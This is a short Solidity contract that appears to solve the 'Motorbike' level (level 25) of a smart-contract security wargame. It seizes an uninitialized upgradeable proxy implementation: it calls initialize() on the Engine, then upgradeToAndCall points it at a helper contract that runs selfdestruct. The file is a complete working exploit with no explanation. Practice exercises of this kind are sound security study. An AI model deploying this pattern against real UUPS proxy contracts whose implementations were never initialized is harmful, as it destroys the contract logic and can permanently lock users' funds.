// SPDX-License-Identifier: MIT
pragma solidity <0.7.0;

import "./Motorbike.sol";

contract Level25 {
    Motorbike motorbike;
    Engine proxiedEngine;
    Engine engine;

    constructor(address payable motorbikeAddr, address engineAddr) public {
        motorbike = Motorbike(motorbikeAddr);
        proxiedEngine = Engine(motorbikeAddr);
        engine = Engine(engineAddr);
    }

    function main() public {
        SelfDestructor selfDestructor = new SelfDestructor();
        engine.initialize();
        engine.upgradeToAndCall(
            address(selfDestructor),
            abi.encodeWithSignature("main()")
        );
    }

    fallback() external payable {}
}

contract SelfDestructor {
    function main() external {
        selfdestruct(payable(msg.sender));
    }
}
